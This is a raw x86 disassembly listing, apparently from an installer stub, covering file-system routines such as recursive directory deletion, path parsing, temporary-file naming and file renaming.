  405090:	ff 35 f0 e7 42 00    	push   0x42e7f0
  405096:	ff d6                	call   *%esi
  405098:	6a 08                	push   $0x8
  40509a:	ff 75 fc             	push   -0x4(%ebp)
  40509d:	ff d6                	call   *%esi
  40509f:	e8 de f0 ff ff       	call   0x404182
  4050a4:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  4050aa:	75 53                	jne    0x4050ff
  4050ac:	39 1d ec e7 42 00    	cmp    %ebx,0x42e7ec
  4050b2:	74 24                	je     0x4050d8
  4050b4:	6a 78                	push   $0x78
  4050b6:	c7 05 50 98 42 00 02 	movl   $0x2,0x429850
  4050bd:	00 00 00 
  4050c0:	e8 c3 ec ff ff       	call   0x403d88
  4050c5:	ff 75 14             	push   0x14(%ebp)
  4050c8:	ff 75 10             	push   0x10(%ebp)
  4050cb:	57                   	push   %edi
  4050cc:	e8 45 ed ff ff       	call   0x403e16
  4050d1:	5f                   	pop    %edi
  4050d2:	5e                   	pop    %esi
  4050d3:	5b                   	pop    %ebx
  4050d4:	c9                   	leave
  4050d5:	c2 10 00             	ret    $0x10
  4050d8:	6a 08                	push   $0x8
  4050da:	ff 35 24 f0 42 00    	push   0x42f024
  4050e0:	ff d6                	call   *%esi
  4050e2:	39 1d ac f0 42 00    	cmp    %ebx,0x42f0ac
  4050e8:	75 0e                	jne    0x4050f8
  4050ea:	a1 58 9c 42 00       	mov    0x429c58,%eax
  4050ef:	53                   	push   %ebx
  4050f0:	ff 70 34             	push   0x34(%eax)
  4050f3:	e8 71 fc ff ff       	call   0x404d69
  4050f8:	6a 01                	push   $0x1
  4050fa:	e8 89 ec ff ff       	call   0x403d88
  4050ff:	83 ff 7b             	cmp    $0x7b,%edi
  405102:	75 c1                	jne    0x4050c5
  405104:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405107:	39 45 10             	cmp    %eax,0x10(%ebp)
  40510a:	75 b9                	jne    0x4050c5
  40510c:	53                   	push   %ebx
  40510d:	53                   	push   %ebx
  40510e:	68 04 10 00 00       	push   $0x1004
  405113:	50                   	push   %eax
  405114:	ff 15 38 72 40 00    	call   *0x407238
  40511a:	3b c3                	cmp    %ebx,%eax
  40511c:	89 45 10             	mov    %eax,0x10(%ebp)
  40511f:	0f 8e f6 00 00 00    	jle    0x40521b
  405125:	ff 15 bc 71 40 00    	call   *0x4071bc
  40512b:	6a e1                	push   $0xffffffe1
  40512d:	53                   	push   %ebx
  40512e:	8b f0                	mov    %eax,%esi
  405130:	e8 91 08 00 00       	call   0x4059c6
  405135:	50                   	push   %eax
  405136:	6a 01                	push   $0x1
  405138:	53                   	push   %ebx
  405139:	56                   	push   %esi
  40513a:	ff 15 b8 71 40 00    	call   *0x4071b8
  405140:	8b 45 14             	mov    0x14(%ebp),%eax
  405143:	83 f8 ff             	cmp    $0xffffffff,%eax
  405146:	75 15                	jne    0x40515d
  405148:	8d 45 ec             	lea    -0x14(%ebp),%eax
  40514b:	50                   	push   %eax
  40514c:	ff 75 fc             	push   -0x4(%ebp)
  40514f:	ff 15 70 71 40 00    	call   *0x407170
  405155:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  405158:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40515b:	eb 09                	jmp    0x405166
  40515d:	0f bf c8             	movswl %ax,%ecx
  405160:	c1 e8 10             	shr    $0x10,%eax
  405163:	0f bf c0             	movswl %ax,%eax
  405166:	53                   	push   %ebx
  405167:	ff 75 08             	push   0x8(%ebp)
  40516a:	53                   	push   %ebx
  40516b:	50                   	push   %eax
  40516c:	51                   	push   %ecx
  40516d:	68 80 01 00 00       	push   $0x180
  405172:	56                   	push   %esi
  405173:	ff 15 14 72 40 00    	call   *0x407214
  405179:	83 f8 01             	cmp    $0x1,%eax
  40517c:	0f 85 99 00 00 00    	jne    0x40521b
  405182:	8b 45 10             	mov    0x10(%ebp),%eax
  405185:	33 f6                	xor    %esi,%esi
  405187:	46                   	inc    %esi
  405188:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40518b:	c7 45 d8 88 a4 42 00 	movl   $0x42a488,-0x28(%ebp)
  405192:	c7 45 dc ff 0f 00 00 	movl   $0xfff,-0x24(%ebp)
  405199:	89 45 08             	mov    %eax,0x8(%ebp)
  40519c:	bf 2d 10 00 00       	mov    $0x102d,%edi
  4051a1:	ff 4d 08             	decl   0x8(%ebp)
  4051a4:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4051a7:	50                   	push   %eax
  4051a8:	ff 75 08             	push   0x8(%ebp)
  4051ab:	57                   	push   %edi
  4051ac:	ff 75 fc             	push   -0x4(%ebp)
  4051af:	ff 15 38 72 40 00    	call   *0x407238
  4051b5:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4051b8:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4051bc:	75 e3                	jne    0x4051a1
  4051be:	53                   	push   %ebx
  4051bf:	ff 15 b0 71 40 00    	call   *0x4071b0
  4051c5:	ff 15 ac 71 40 00    	call   *0x4071ac
  4051cb:	56                   	push   %esi
  4051cc:	6a 42                	push   $0x42
  4051ce:	ff 15 f8 70 40 00    	call   *0x4070f8
  4051d4:	50                   	push   %eax
  4051d5:	89 45 08             	mov    %eax,0x8(%ebp)
  4051d8:	ff 15 c4 70 40 00    	call   *0x4070c4
  4051de:	8b f0                	mov    %eax,%esi
  4051e0:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4051e3:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4051e6:	50                   	push   %eax
  4051e7:	53                   	push   %ebx
  4051e8:	57                   	push   %edi
  4051e9:	ff 75 fc             	push   -0x4(%ebp)
  4051ec:	ff 15 38 72 40 00    	call   *0x407238
  4051f2:	03 f0                	add    %eax,%esi
  4051f4:	66 c7 06 0d 0a       	movw   $0xa0d,(%esi)
  4051f9:	46                   	inc    %esi
  4051fa:	46                   	inc    %esi
  4051fb:	43                   	inc    %ebx
  4051fc:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  4051ff:	7c df                	jl     0x4051e0
  405201:	ff 75 08             	push   0x8(%ebp)
  405204:	ff 15 c0 70 40 00    	call   *0x4070c0
  40520a:	ff 75 08             	push   0x8(%ebp)
  40520d:	6a 01                	push   $0x1
  40520f:	ff 15 a8 71 40 00    	call   *0x4071a8
  405215:	ff 15 a4 71 40 00    	call   *0x4071a4
  40521b:	33 c0                	xor    %eax,%eax
  40521d:	e9 af fe ff ff       	jmp    0x4050d1
  405222:	55                   	push   %ebp
  405223:	8b ec                	mov    %esp,%ebp
  405225:	83 ec 10             	sub    $0x10,%esp
  405228:	ff 75 0c             	push   0xc(%ebp)
  40522b:	c7 05 90 c4 42 00 44 	movl   $0x44,0x42c490
  405232:	00 00 00 
  405235:	ff 15 7c 70 40 00    	call   *0x40707c
  40523b:	33 c9                	xor    %ecx,%ecx
  40523d:	83 f8 ff             	cmp    $0xffffffff,%eax
  405240:	74 04                	je     0x405246
  405242:	a8 10                	test   $0x10,%al
  405244:	75 03                	jne    0x405249
  405246:	89 4d 0c             	mov    %ecx,0xc(%ebp)
  405249:	8d 45 f0             	lea    -0x10(%ebp),%eax
  40524c:	50                   	push   %eax
  40524d:	68 90 c4 42 00       	push   $0x42c490
  405252:	ff 75 0c             	push   0xc(%ebp)
  405255:	51                   	push   %ecx
  405256:	51                   	push   %ecx
  405257:	51                   	push   %ecx
  405258:	51                   	push   %ecx
  405259:	51                   	push   %ecx
  40525a:	ff 75 08             	push   0x8(%ebp)
  40525d:	51                   	push   %ecx
  40525e:	ff 15 cc 70 40 00    	call   *0x4070cc
  405264:	85 c0                	test   %eax,%eax
  405266:	74 0c                	je     0x405274
  405268:	ff 75 f4             	push   -0xc(%ebp)
  40526b:	ff 15 a4 70 40 00    	call   *0x4070a4
  405271:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405274:	c9                   	leave
  405275:	c2 08 00             	ret    $0x8
  405278:	ff 25 c4 71 40 00    	jmp    *0x4071c4
  40527e:	68 00 04 00 00       	push   $0x400
  405283:	ff 74 24 0c          	push   0xc(%esp)
  405287:	ff 74 24 0c          	push   0xc(%esp)
  40528b:	ff 35 f8 e7 42 00    	push   0x42e7f8
  405291:	ff 15 c8 71 40 00    	call   *0x4071c8
  405297:	c2 08 00             	ret    $0x8
  40529a:	8b 44 24 08          	mov    0x8(%esp),%eax
  40529e:	8b c8                	mov    %eax,%ecx
  4052a0:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  4052a6:	83 3d c0 f0 42 00 00 	cmpl   $0x0,0x42f0c0
  4052ad:	74 05                	je     0x4052b4
  4052af:	c1 e8 15             	shr    $0x15,%eax
  4052b2:	75 25                	jne    0x4052d9
  4052b4:	83 3d c8 f0 42 00 00 	cmpl   $0x0,0x42f0c8
  4052bb:	74 06                	je     0x4052c3
  4052bd:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  4052c3:	51                   	push   %ecx
  4052c4:	68 20 e8 42 00       	push   $0x42e820
  4052c9:	ff 74 24 0c          	push   0xc(%esp)
  4052cd:	ff 35 24 f0 42 00    	push   0x42f024
  4052d3:	ff 15 cc 71 40 00    	call   *0x4071cc
  4052d9:	c2 08 00             	ret    $0x8
  4052dc:	55                   	push   %ebp
  4052dd:	8b ec                	mov    %esp,%ebp
  4052df:	81 ec 48 01 00 00    	sub    $0x148,%esp
  4052e5:	53                   	push   %ebx
  4052e6:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4052e9:	56                   	push   %esi
  4052ea:	53                   	push   %ebx
  4052eb:	e8 8d 02 00 00       	call   0x40557d
  4052f0:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4052f3:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4052f6:	f6 c1 08             	test   $0x8,%cl
  4052f9:	74 17                	je     0x405312
  4052fb:	53                   	push   %ebx
  4052fc:	ff 15 40 71 40 00    	call   *0x407140
  405302:	f7 d8                	neg    %eax
  405304:	1b c0                	sbb    %eax,%eax
  405306:	40                   	inc    %eax
  405307:	01 05 a8 f0 42 00    	add    %eax,0x42f0a8
  40530d:	e9 85 01 00 00       	jmp    0x405497
  405312:	89 4d 08             	mov    %ecx,0x8(%ebp)
  405315:	57                   	push   %edi
  405316:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  40531a:	74 11                	je     0x40532d
  40531c:	85 c0                	test   %eax,%eax
  40531e:	0f 84 1e 01 00 00    	je     0x405442
  405324:	f6 c1 02             	test   $0x2,%cl
  405327:	0f 84 15 01 00 00    	je     0x405442
  40532d:	be 90 b4 42 00       	mov    $0x42b490,%esi
  405332:	53                   	push   %ebx
  405333:	56                   	push   %esi
  405334:	e8 6b 06 00 00       	call   0x4059a4
  405339:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40533d:	74 0d                	je     0x40534c
  40533f:	68 ec 92 40 00       	push   $0x4092ec
  405344:	56                   	push   %esi
  405345:	e8 76 06 00 00       	call   0x4059c0
  40534a:	eb 06                	jmp    0x405352
  40534c:	53                   	push   %ebx
  40534d:	e8 92 01 00 00       	call   0x4054e4
  405352:	68 10 90 40 00       	push   $0x409010
  405357:	53                   	push   %ebx
  405358:	e8 63 06 00 00       	call   0x4059c0
  40535d:	53                   	push   %ebx
  40535e:	e8 57 06 00 00       	call   0x4059ba
  405363:	8b f8                	mov    %eax,%edi
  405365:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  40536b:	50                   	push   %eax
  40536c:	56                   	push   %esi
  40536d:	03 fb                	add    %ebx,%edi
  40536f:	ff 15 3c 71 40 00    	call   *0x40713c
  405375:	83 f8 ff             	cmp    $0xffffffff,%eax
  405378:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40537b:	0f 84 b7 00 00 00    	je     0x405438
  405381:	8d 85 e4 fe ff ff    	lea    -0x11c(%ebp),%eax
  405387:	6a 3f                	push   $0x3f
  405389:	50                   	push   %eax
  40538a:	8d b5 e4 fe ff ff    	lea    -0x11c(%ebp),%esi
  405390:	e8 33 01 00 00       	call   0x4054c8
  405395:	80 38 00             	cmpb   $0x0,(%eax)
  405398:	74 09                	je     0x4053a3
  40539a:	80 7d e8 00          	cmpb   $0x0,-0x18(%ebp)
  40539e:	74 03                	je     0x4053a3
  4053a0:	8d 75 e8             	lea    -0x18(%ebp),%esi
  4053a3:	80 3e 2e             	cmpb   $0x2e,(%esi)
  4053a6:	75 11                	jne    0x4053b9
  4053a8:	8a 46 01             	mov    0x1(%esi),%al
  4053ab:	84 c0                	test   %al,%al
  4053ad:	74 68                	je     0x405417
  4053af:	3c 2e                	cmp    $0x2e,%al
  4053b1:	75 06                	jne    0x4053b9
  4053b3:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  4053b7:	74 5e                	je     0x405417
  4053b9:	56                   	push   %esi
  4053ba:	57                   	push   %edi
  4053bb:	e8 e4 05 00 00       	call   0x4059a4
  4053c0:	f6 85 b8 fe ff ff 10 	testb  $0x10,-0x148(%ebp)
  4053c7:	74 15                	je     0x4053de
  4053c9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4053cc:	83 e0 03             	and    $0x3,%eax
  4053cf:	3c 03                	cmp    $0x3,%al
  4053d1:	75 44                	jne    0x405417
  4053d3:	ff 75 0c             	push   0xc(%ebp)
  4053d6:	53                   	push   %ebx
  4053d7:	e8 00 ff ff ff       	call   0x4052dc
  4053dc:	eb 39                	jmp    0x405417
  4053de:	53                   	push   %ebx
  4053df:	e8 7d 02 00 00       	call   0x405661
  4053e4:	53                   	push   %ebx
  4053e5:	ff 15 40 71 40 00    	call   *0x407140
  4053eb:	85 c0                	test   %eax,%eax
  4053ed:	75 20                	jne    0x40540f
  4053ef:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  4053f3:	74 12                	je     0x405407
  4053f5:	53                   	push   %ebx
  4053f6:	6a f1                	push   $0xfffffff1
  4053f8:	e8 6c f9 ff ff       	call   0x404d69
  4053fd:	6a 00                	push   $0x0
  4053ff:	53                   	push   %ebx
  405400:	e8 f2 02 00 00       	call   0x4056f7
  405405:	eb 10                	jmp    0x405417
  405407:	ff 05 a8 f0 42 00    	incl   0x42f0a8
  40540d:	eb 08                	jmp    0x405417
  40540f:	53                   	push   %ebx
  405410:	6a f2                	push   $0xfffffff2
  405412:	e8 52 f9 ff ff       	call   0x404d69
  405417:	8d 85 b8 fe ff ff    	lea    -0x148(%ebp),%eax
  40541d:	50                   	push   %eax
  40541e:	ff 75 fc             	push   -0x4(%ebp)
  405421:	ff 15 38 71 40 00    	call   *0x407138
  405427:	85 c0                	test   %eax,%eax
  405429:	0f 85 52 ff ff ff    	jne    0x405381
  40542f:	ff 75 fc             	push   -0x4(%ebp)
  405432:	ff 15 34 71 40 00    	call   *0x407134
  405438:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  40543c:	74 04                	je     0x405442
  40543e:	80 67 ff 00          	andb   $0x0,-0x1(%edi)
  405442:	33 f6                	xor    %esi,%esi
  405444:	5f                   	pop    %edi
  405445:	39 75 08             	cmp    %esi,0x8(%ebp)
  405448:	74 4d                	je     0x405497
  40544a:	39 75 f8             	cmp    %esi,-0x8(%ebp)
  40544d:	75 08                	jne    0x405457
  40544f:	ff 05 a8 f0 42 00    	incl   0x42f0a8
  405455:	eb 40                	jmp    0x405497
  405457:	53                   	push   %ebx
  405458:	e8 0f 08 00 00       	call   0x405c6c
  40545d:	85 c0                	test   %eax,%eax
  40545f:	74 36                	je     0x405497
  405461:	53                   	push   %ebx
  405462:	e8 36 00 00 00       	call   0x40549d
  405467:	53                   	push   %ebx
  405468:	e8 f4 01 00 00       	call   0x405661
  40546d:	53                   	push   %ebx
  40546e:	ff 15 d0 70 40 00    	call   *0x4070d0
  405474:	85 c0                	test   %eax,%eax
  405476:	75 17                	jne    0x40548f
  405478:	f6 45 0c 04          	testb  $0x4,0xc(%ebp)
  40547c:	74 d1                	je     0x40544f
  40547e:	53                   	push   %ebx
  40547f:	6a f1                	push   $0xfffffff1
  405481:	e8 e3 f8 ff ff       	call   0x404d69
  405486:	56                   	push   %esi
  405487:	53                   	push   %ebx
  405488:	e8 6a 02 00 00       	call   0x4056f7
  40548d:	eb 08                	jmp    0x405497
  40548f:	53                   	push   %ebx
  405490:	6a e5                	push   $0xffffffe5
  405492:	e8 d2 f8 ff ff       	call   0x404d69
  405497:	5e                   	pop    %esi
  405498:	5b                   	pop    %ebx
  405499:	c9                   	leave
  40549a:	c2 08 00             	ret    $0x8
  40549d:	56                   	push   %esi
  40549e:	8b 74 24 08          	mov    0x8(%esp),%esi
  4054a2:	56                   	push   %esi
  4054a3:	e8 12 05 00 00       	call   0x4059ba
  4054a8:	03 c6                	add    %esi,%eax
  4054aa:	50                   	push   %eax
  4054ab:	56                   	push   %esi
  4054ac:	ff 15 d0 71 40 00    	call   *0x4071d0
  4054b2:	80 38 5c             	cmpb   $0x5c,(%eax)
  4054b5:	74 0b                	je     0x4054c2
  4054b7:	68 10 90 40 00       	push   $0x409010
  4054bc:	56                   	push   %esi
  4054bd:	e8 fe 04 00 00       	call   0x4059c0
  4054c2:	8b c6                	mov    %esi,%eax
  4054c4:	5e                   	pop    %esi
  4054c5:	c2 04 00             	ret    $0x4
  4054c8:	8b 44 24 04          	mov    0x4(%esp),%eax
  4054cc:	eb 0d                	jmp    0x4054db
  4054ce:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  4054d2:	74 0d                	je     0x4054e1
  4054d4:	50                   	push   %eax
  4054d5:	ff 15 10 72 40 00    	call   *0x407210
  4054db:	8a 08                	mov    (%eax),%cl
  4054dd:	84 c9                	test   %cl,%cl
  4054df:	75 ed                	jne    0x4054ce
  4054e1:	c2 08 00             	ret    $0x8
  4054e4:	56                   	push   %esi
  4054e5:	8b 74 24 08          	mov    0x8(%esp),%esi
  4054e9:	56                   	push   %esi
  4054ea:	e8 cb 04 00 00       	call   0x4059ba
  4054ef:	03 c6                	add    %esi,%eax
  4054f1:	80 38 5c             	cmpb   $0x5c,(%eax)
  4054f4:	74 0c                	je     0x405502
  4054f6:	50                   	push   %eax
  4054f7:	56                   	push   %esi
  4054f8:	ff 15 d0 71 40 00    	call   *0x4071d0
  4054fe:	3b c6                	cmp    %esi,%eax
  405500:	77 ef                	ja     0x4054f1
  405502:	80 20 00             	andb   $0x0,(%eax)
  405505:	5e                   	pop    %esi
  405506:	c2 04 00             	ret    $0x4
  405509:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40550d:	8a 01                	mov    (%ecx),%al
  40550f:	0c 20                	or     $0x20,%al
  405511:	66 81 39 5c 5c       	cmpw   $0x5c5c,(%ecx)
  405516:	74 12                	je     0x40552a
  405518:	3c 61                	cmp    $0x61,%al
  40551a:	7c 0a                	jl     0x405526
  40551c:	3c 7a                	cmp    $0x7a,%al
  40551e:	7f 06                	jg     0x405526
  405520:	80 79 01 3a          	cmpb   $0x3a,0x1(%ecx)
  405524:	74 04                	je     0x40552a
  405526:	33 c0                	xor    %eax,%eax
  405528:	eb 03                	jmp    0x40552d
  40552a:	33 c0                	xor    %eax,%eax
  40552c:	40                   	inc    %eax
  40552d:	c2 04 00             	ret    $0x4
  405530:	53                   	push   %ebx
  405531:	56                   	push   %esi
  405532:	8b 35 10 72 40 00    	mov    0x407210,%esi
  405538:	57                   	push   %edi
  405539:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40553d:	57                   	push   %edi
  40553e:	ff d6                	call   *%esi
  405540:	8b d8                	mov    %eax,%ebx
  405542:	53                   	push   %ebx
  405543:	ff d6                	call   *%esi
  405545:	80 3f 00             	cmpb   $0x0,(%edi)
  405548:	74 0c                	je     0x405556
  40554a:	66 81 3b 3a 5c       	cmpw   $0x5c3a,(%ebx)
  40554f:	75 05                	jne    0x405556
  405551:	50                   	push   %eax
  405552:	ff d6                	call   *%esi
  405554:	eb 21                	jmp    0x405577
  405556:	66 81 3f 5c 5c       	cmpw   $0x5c5c,(%edi)
  40555b:	75 18                	jne    0x405575
  40555d:	6a 02                	push   $0x2
  40555f:	5e                   	pop    %esi
  405560:	6a 5c                	push   $0x5c
  405562:	50                   	push   %eax
  405563:	4e                   	dec    %esi
  405564:	e8 5f ff ff ff       	call   0x4054c8
  405569:	80 38 00             	cmpb   $0x0,(%eax)
  40556c:	74 07                	je     0x405575
  40556e:	40                   	inc    %eax
  40556f:	85 f6                	test   %esi,%esi
  405571:	75 ed                	jne    0x405560
  405573:	eb 02                	jmp    0x405577
  405575:	33 c0                	xor    %eax,%eax
  405577:	5f                   	pop    %edi
  405578:	5e                   	pop    %esi
  405579:	5b                   	pop    %ebx
  40557a:	c2 04 00             	ret    $0x4
  40557d:	56                   	push   %esi
  40557e:	57                   	push   %edi
  40557f:	ff 74 24 0c          	push   0xc(%esp)
  405583:	be 90 b8 42 00       	mov    $0x42b890,%esi
  405588:	56                   	push   %esi
  405589:	e8 16 04 00 00       	call   0x4059a4
  40558e:	56                   	push   %esi
  40558f:	e8 9c ff ff ff       	call   0x405530
  405594:	8b f8                	mov    %eax,%edi
  405596:	85 ff                	test   %edi,%edi
  405598:	75 04                	jne    0x40559e
  40559a:	33 c0                	xor    %eax,%eax
  40559c:	eb 52                	jmp    0x4055f0
  40559e:	57                   	push   %edi
  40559f:	e8 2f 06 00 00       	call   0x405bd3
  4055a4:	f6 05 30 f0 42 00 80 	testb  $0x80,0x42f030
  4055ab:	74 0a                	je     0x4055b7
  4055ad:	8a 07                	mov    (%edi),%al
  4055af:	84 c0                	test   %al,%al
  4055b1:	74 e7                	je     0x40559a
  4055b3:	3c 5c                	cmp    $0x5c,%al
  4055b5:	74 e3                	je     0x40559a
  4055b7:	2b fe                	sub    %esi,%edi
  4055b9:	eb 14                	jmp    0x4055cf
  4055bb:	e8 ac 06 00 00       	call   0x405c6c
  4055c0:	85 c0                	test   %eax,%eax
  4055c2:	74 05                	je     0x4055c9
  4055c4:	f6 00 10             	testb  $0x10,(%eax)
  4055c7:	74 d1                	je     0x40559a
  4055c9:	56                   	push   %esi
  4055ca:	e8 15 ff ff ff       	call   0x4054e4
  4055cf:	56                   	push   %esi
  4055d0:	e8 e5 03 00 00       	call   0x4059ba
  4055d5:	3b c7                	cmp    %edi,%eax
  4055d7:	56                   	push   %esi
  4055d8:	7f e1                	jg     0x4055bb
  4055da:	e8 be fe ff ff       	call   0x40549d
  4055df:	56                   	push   %esi
  4055e0:	ff 15 7c 70 40 00    	call   *0x40707c
  4055e6:	33 c9                	xor    %ecx,%ecx
  4055e8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4055eb:	0f 95 c1             	setne  %cl
  4055ee:	8b c1                	mov    %ecx,%eax
  4055f0:	5f                   	pop    %edi
  4055f1:	5e                   	pop    %esi
  4055f2:	c2 04 00             	ret    $0x4
  4055f5:	53                   	push   %ebx
  4055f6:	56                   	push   %esi
  4055f7:	57                   	push   %edi
  4055f8:	ff 74 24 14          	push   0x14(%esp)
  4055fc:	e8 b9 03 00 00       	call   0x4059ba
  405601:	8b f8                	mov    %eax,%edi
  405603:	8b 74 24 10          	mov    0x10(%esp),%esi
  405607:	eb 22                	jmp    0x40562b
  405609:	ff 74 24 14          	push   0x14(%esp)
  40560d:	8a 1c 37             	mov    (%edi,%esi,1),%bl
  405610:	80 24 37 00          	andb   $0x0,(%edi,%esi,1)
  405614:	56                   	push   %esi
  405615:	ff 15 e8 70 40 00    	call   *0x4070e8
  40561b:	85 c0                	test   %eax,%eax
  40561d:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  405620:	74 1b                	je     0x40563d
  405622:	56                   	push   %esi
  405623:	ff 15 10 72 40 00    	call   *0x407210
  405629:	8b f0                	mov    %eax,%esi
  40562b:	56                   	push   %esi
  40562c:	e8 89 03 00 00       	call   0x4059ba
  405631:	3b c7                	cmp    %edi,%eax
  405633:	7d d4                	jge    0x405609
  405635:	33 c0                	xor    %eax,%eax
  405637:	5f                   	pop    %edi
  405638:	5e                   	pop    %esi
  405639:	5b                   	pop    %ebx
  40563a:	c2 08 00             	ret    $0x8
  40563d:	8b c6                	mov    %esi,%eax
  40563f:	eb f6                	jmp    0x405637
  405641:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405645:	56                   	push   %esi
  405646:	8b 74 24 10          	mov    0x10(%esp),%esi
  40564a:	85 f6                	test   %esi,%esi
  40564c:	7e 0f                	jle    0x40565d
  40564e:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405652:	2b c1                	sub    %ecx,%eax
  405654:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405657:	88 11                	mov    %dl,(%ecx)
  405659:	41                   	inc    %ecx
  40565a:	4e                   	dec    %esi
  40565b:	75 f7                	jne    0x405654
  40565d:	5e                   	pop    %esi
  40565e:	c2 0c 00             	ret    $0xc
  405661:	ff 74 24 04          	push   0x4(%esp)
  405665:	ff 15 7c 70 40 00    	call   *0x40707c
  40566b:	83 f8 ff             	cmp    $0xffffffff,%eax
  40566e:	74 0d                	je     0x40567d
  405670:	24 fe                	and    $0xfe,%al
  405672:	50                   	push   %eax
  405673:	ff 74 24 08          	push   0x8(%esp)
  405677:	ff 15 88 70 40 00    	call   *0x407088
  40567d:	c2 04 00             	ret    $0x4
  405680:	ff 74 24 04          	push   0x4(%esp)
  405684:	ff 15 7c 70 40 00    	call   *0x40707c
  40568a:	8b c8                	mov    %eax,%ecx
  40568c:	6a 00                	push   $0x0
  40568e:	41                   	inc    %ecx
  40568f:	f7 d9                	neg    %ecx
  405691:	1b c9                	sbb    %ecx,%ecx
  405693:	23 c8                	and    %eax,%ecx
  405695:	51                   	push   %ecx
  405696:	ff 74 24 14          	push   0x14(%esp)
  40569a:	6a 00                	push   $0x0
  40569c:	6a 01                	push   $0x1
  40569e:	ff 74 24 1c          	push   0x1c(%esp)
  4056a2:	ff 74 24 1c          	push   0x1c(%esp)
  4056a6:	ff 15 d4 70 40 00    	call   *0x4070d4
  4056ac:	c2 0c 00             	ret    $0xc
  4056af:	55                   	push   %ebp
  4056b0:	8b ec                	mov    %esp,%ebp
  4056b2:	56                   	push   %esi
  4056b3:	8b 75 08             	mov    0x8(%ebp),%esi
  4056b6:	57                   	push   %edi
  4056b7:	6a 64                	push   $0x64
  4056b9:	5f                   	pop    %edi
  4056ba:	4f                   	dec    %edi
  4056bb:	c7 45 08 6e 73 61 00 	movl   $0x61736e,0x8(%ebp)
  4056c2:	ff 15 98 70 40 00    	call   *0x407098
  4056c8:	6a 1a                	push   $0x1a
  4056ca:	33 d2                	xor    %edx,%edx
  4056cc:	59                   	pop    %ecx
  4056cd:	f7 f1                	div    %ecx
  4056cf:	56                   	push   %esi
  4056d0:	8d 45 08             	lea    0x8(%ebp),%eax
  4056d3:	6a 00                	push   $0x0
  4056d5:	50                   	push   %eax
  4056d6:	ff 75 0c             	push   0xc(%ebp)
  4056d9:	00 55 0a             	add    %dl,0xa(%ebp)
  4056dc:	ff 15 d8 70 40 00    	call   *0x4070d8
  4056e2:	85 c0                	test   %eax,%eax
  4056e4:	75 0d                	jne    0x4056f3
  4056e6:	85 ff                	test   %edi,%edi
  4056e8:	75 d0                	jne    0x4056ba
  4056ea:	80 26 00             	andb   $0x0,(%esi)
  4056ed:	5f                   	pop    %edi
  4056ee:	5e                   	pop    %esi
  4056ef:	5d                   	pop    %ebp
  4056f0:	c2 08 00             	ret    $0x8
  4056f3:	8b c6                	mov    %esi,%eax
  4056f5:	eb f6                	jmp    0x4056ed
  4056f7:	53                   	push   %ebx
  4056f8:	55                   	push   %ebp
  4056f9:	56                   	push   %esi
  4056fa:	57                   	push   %edi
  4056fb:	68 0c 93 40 00       	push   $0x40930c
  405700:	68 b4 92 40 00       	push   $0x4092b4
  405705:	e8 a0 05 00 00       	call   0x405caa
  40570a:	85 c0                	test   %eax,%eax
  40570c:	8b 74 24 18          	mov    0x18(%esp),%esi
  405710:	74 11                	je     0x405723
  405712:	6a 05                	push   $0x5
  405714:	56                   	push   %esi
  405715:	ff 74 24 1c          	push   0x1c(%esp)
  405719:	ff d0                	call   *%eax
  40571b:	85 c0                	test   %eax,%eax
  40571d:	0f 85 39 01 00 00    	jne    0x40585c
  405723:	8b 1d 6c 70 40 00    	mov    0x40706c,%ebx
  405729:	c7 05 18 c6 42 00 4e 	movl   $0x4c554e,0x42c618
  405730:	55 4c 00 
  405733:	85 f6                	test   %esi,%esi
  405735:	bf 00 04 00 00       	mov    $0x400,%edi
  40573a:	bd 18 c6 42 00       	mov    $0x42c618,%ebp
  40573f:	74 26                	je     0x405767
  405741:	6a 01                	push   $0x1
  405743:	6a 00                	push   $0x0
  405745:	56                   	push   %esi
  405746:	e8 35 ff ff ff       	call   0x405680
  40574b:	50                   	push   %eax
  40574c:	ff 15 a4 70 40 00    	call   *0x4070a4
  405752:	57                   	push   %edi
  405753:	55                   	push   %ebp
  405754:	56                   	push   %esi
  405755:	ff d3                	call   *%ebx
  405757:	85 c0                	test   %eax,%eax
  405759:	0f 84 03 01 00 00    	je     0x405862
  40575f:	3b c7                	cmp    %edi,%eax
  405761:	0f 8f fb 00 00 00    	jg     0x405862
  405767:	be 90 c0 42 00       	mov    $0x42c090,%esi
  40576c:	57                   	push   %edi
  40576d:	56                   	push   %esi
  40576e:	ff 74 24 1c          	push   0x1c(%esp)
  405772:	ff d3                	call   *%ebx
  405774:	85 c0                	test   %eax,%eax
  405776:	0f 84 e6 00 00 00    	je     0x405862
  40577c:	3b c7                	cmp    %edi,%eax
  40577e:	0f 8f de 00 00 00    	jg     0x405862
  405784:	56                   	push   %esi
  405785:	55                   	push   %ebp
  405786:	68 04 93 40 00       	push   $0x409304
  40578b:	68 90 bc 42 00       	push   $0x42bc90
  405790:	ff 15 54 72 40 00    	call   *0x407254
